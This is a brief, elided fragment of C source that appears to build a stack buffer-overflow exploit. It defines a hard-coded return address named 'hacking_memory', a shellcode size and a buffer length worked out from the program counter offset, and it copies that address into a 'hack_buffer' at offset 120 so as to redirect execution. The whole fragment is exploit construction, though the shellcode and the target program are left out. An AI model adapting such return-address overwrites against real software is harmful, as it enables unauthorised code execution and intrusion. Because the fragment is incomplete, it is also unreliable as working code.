...
#define hacking_memory "\x10\xfe\x21\x20\x00" // memory of buffer
#define shell_size 45 // not 46
#define buffer_len 125 // program counter memory address - buffer address + 4 (for rp) + 1 (null character)
...
main ( int argc, char * argv[] )
{
	...
	memcpy(&hack_buffer[120], hacking_memory, 4);
